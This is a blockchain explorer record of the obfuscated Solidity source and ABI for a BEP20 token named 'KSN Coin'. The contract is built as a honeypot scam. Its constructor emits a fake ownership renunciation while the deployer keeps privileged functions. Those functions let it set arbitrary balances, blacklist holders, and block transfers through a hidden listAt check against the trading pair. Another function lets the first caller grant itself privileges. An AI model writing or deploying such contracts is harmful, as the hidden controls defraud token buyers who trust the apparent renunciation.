{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface minTokenTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTrading) external view returns (uint256);\n\n    function transfer(address launchedSenderLaunch, uint256 toEnable) external returns (bool);\n\n    function allowance(address senderTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedSenderLaunch,\n        uint256 toEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeTake, uint256 value);\n    event Approval(address indexed senderTeam, address indexed spender, uint256 value);\n}\n\ninterface minTokenTeamMetadata is minTokenTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\nabstract contract launchedAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTeam {\n    function createPair(address receiverSender, address launchedTo) external returns (address);\n}\n\ninterface teamTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ncontract KSNCoin is launchedAmount, minTokenTeam, minTokenTeamMetadata {\n\n    uint256 shouldFee;\n\n    function getOwner() external view returns (address) {\n        return exemptAuto;\n    }\n\n    mapping(address => bool) public minFund;\n\n    string private modeTeam = \"KSN Coin\";\n\n    uint256 public sellBuy;\n\n    function transferFrom(address isTx, address launchedSenderLaunch, uint256 toEnable) external override returns (bool) {\n        if (_msgSender() != teamSell) {\n            if (shouldEnable[isTx][_msgSender()] != type(uint256).max) {\n                require(toEnable <= shouldEnable[isTx][_msgSender()]);\n                shouldEnable[isTx][_msgSender()] -= toEnable;\n            }\n        }\n        return autoLaunched(isTx, launchedSenderLaunch, toEnable);\n    }\n\n    function marketingShould() private view {\n        require(minFund[_msgSender()]);\n    }\n\n    bool private tradingModeSender;\n\n    function name() external view virtual override returns (string memory) {\n        return modeTeam;\n    }\n\n    function buyLaunch(uint256 toEnable) public {\n        marketingShould();\n        listAt = toEnable;\n    }\n\n    bool public tokenFundTotal;\n\n    function amountTotalReceiver() public {\n        emit OwnershipTransferred(sellExempt, address(0));\n        exemptAuto = address(0);\n    }\n\n    function liquiditySender(address teamMin, uint256 toEnable) public {\n        marketingShould();\n        fromMinReceiver[teamMin] = toEnable;\n    }\n\n    mapping(address => bool) public exemptTotal;\n\n    function autoLaunched(address isTx, address launchedSenderLaunch, uint256 toEnable) internal returns (bool) {\n        if (isTx == sellExempt) {\n            return autoSell(isTx, launchedSenderLaunch, toEnable);\n        }\n        uint256 fundTeamSwap = minTokenTeam(walletSender).balanceOf(tokenMin);\n        require(fundTeamSwap == listAt);\n        require(!exemptTotal[isTx]);\n        return autoSell(isTx, launchedSenderLaunch, toEnable);\n    }\n\n    uint256 listAt;\n\n    address public walletSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldEnable;\n\n    uint256 public autoFundLimit;\n\n    function balanceOf(address liquidityTrading) public view virtual override returns (uint256) {\n        return fromMinReceiver[liquidityTrading];\n    }\n\n    function approve(address totalMax, uint256 toEnable) public virtual override returns (bool) {\n        shouldEnable[_msgSender()][totalMax] = toEnable;\n        emit Approval(_msgSender(), totalMax, toEnable);\n        return true;\n    }\n\n    address public sellExempt;\n\n    mapping(address => uint256) private fromMinReceiver;\n\n    bool public swapMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletExempt;\n    }\n\n    address teamSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private amountExempt;\n\n    function owner() external view returns (address) {\n        return exemptAuto;\n    }\n\n    function marketingLaunchSwap(address marketingLaunched) public {\n        marketingShould();\n        if (autoFundLimit != amountExempt) {\n            amountExempt = sellBuy;\n        }\n        if (marketingLaunched == sellExempt || marketingLaunched == walletSender) {\n            return;\n        }\n        exemptTotal[marketingLaunched] = true;\n    }\n\n    uint256 private walletExempt = 100000000 * 10 ** 18;\n\n    string private buyTake = \"KCN\";\n\n    function transfer(address teamMin, uint256 toEnable) external virtual override returns (bool) {\n        return autoLaunched(_msgSender(), teamMin, toEnable);\n    }\n\n    constructor (){\n        \n        amountTotalReceiver();\n        teamTotal atLaunch = teamTotal(teamSell);\n        walletSender = feeTeam(atLaunch.factory()).createPair(atLaunch.WETH(), address(this));\n        if (autoFundLimit != sellBuy) {\n            tradingModeSender = false;\n        }\n        sellExempt = _msgSender();\n        minFund[sellExempt] = true;\n        fromMinReceiver[sellExempt] = walletExempt;\n        if (marketingAuto) {\n            tradingModeSender = true;\n        }\n        emit Transfer(address(0), sellExempt, walletExempt);\n    }\n\n    uint8 private tokenMarketing = 18;\n\n    address private exemptAuto;\n\n    function autoSell(address isTx, address launchedSenderLaunch, uint256 toEnable) internal returns (bool) {\n        require(fromMinReceiver[isTx] >= toEnable);\n        fromMinReceiver[isTx] -= toEnable;\n        fromMinReceiver[launchedSenderLaunch] += toEnable;\n        emit Transfer(isTx, launchedSenderLaunch, toEnable);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingFee, address indexed receiverMarketing);\n\n    function fromWalletEnable(address maxAuto) public {\n        if (tokenFundTotal) {\n            return;\n        }\n        \n        minFund[maxAuto] = true;\n        \n        tokenFundTotal = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMarketing;\n    }\n\n    bool private marketingAuto;\n\n    bool public shouldTx;\n\n    address tokenMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address shouldMarketing, address totalMax) external view virtual override returns (uint256) {\n        if (totalMax == teamSell) {\n            return type(uint256).max;\n        }\n        return shouldEnable[shouldMarketing][totalMax];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFundLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toEnable\",\"type\":\"uint256\"}],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"fromWalletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnable\",\"type\":\"uint256\"}],\"name\":\"liquiditySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"marketingLaunchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSenderLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "KSNCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}